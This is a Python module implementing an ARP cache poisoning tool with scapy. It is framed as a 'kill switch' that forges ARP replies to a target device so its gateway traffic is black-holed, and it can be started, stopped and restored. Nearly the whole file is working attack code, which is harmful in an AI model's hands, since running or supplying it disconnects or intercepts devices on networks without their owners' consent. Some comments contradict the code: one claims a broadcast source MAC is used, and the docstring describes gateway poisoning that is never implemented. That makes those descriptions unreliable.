"""ARP cache poisoning for network denial.

Sends crafted ARP replies to either:
1. The target — telling it the gateway is at our MAC (MITM/denial)
2. The gateway — telling it the target is at our MAC (intercept return traffic)

For kill switch mode, we send the target a fake gateway MAC, causing
its traffic to be sent to a non-existent host (black-holed).
"""

import time
import threading
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf


class ARPPoisoner:
    """ARP cache poisoning attack for device denial-of-service."""

    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None):
        """Initialize the ARP poisoner.

        Args:
            target_ip: IP of the device to disconnect.
            gateway_ip: IP of the network gateway.
            interface: Network interface to use (auto-detected if None).
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        self._running = False
        self._thread: threading.Thread | None = None

    def _get_mac(self, ip: str) -> str | None:
        """Resolve IP to MAC address via ARP."""
        return getmacbyip(ip)

    def _poison(self) -> None:
        """Send poisoned ARP replies continuously."""
        target_mac = self._get_mac(self.target_ip)
        if not target_mac:
            raise RuntimeError(f"Could not resolve MAC for {self.target_ip}")

        # Craft ARP reply: tell target that gateway is at a fake MAC
        # Using broadcast MAC as source effectively black-holes traffic
        poison_packet = Ether(dst=target_mac) / ARP(
            op="is-at",
            psrc=self.gateway_ip,
            pdst=self.target_ip,
            hwdst=target_mac,
            # hwsrc defaults to our MAC — target sends traffic to us (which we drop)
        )

        while self._running:
            sendp(poison_packet, iface=self.interface, verbose=False)
            time.sleep(1)

    def start(self) -> None:
        """Start the ARP poisoning attack (runs in background thread)."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._poison, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the attack and restore the target's ARP cache."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

        # Restore: send correct ARP to target
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)
        if target_mac and gateway_mac:
            restore_packet = Ether(dst=target_mac) / ARP(
                op="is-at",
                psrc=self.gateway_ip,
                hwsrc=gateway_mac,
                pdst=self.target_ip,
                hwdst=target_mac,
            )
            sendp(restore_packet, iface=self.interface, count=5, verbose=False)
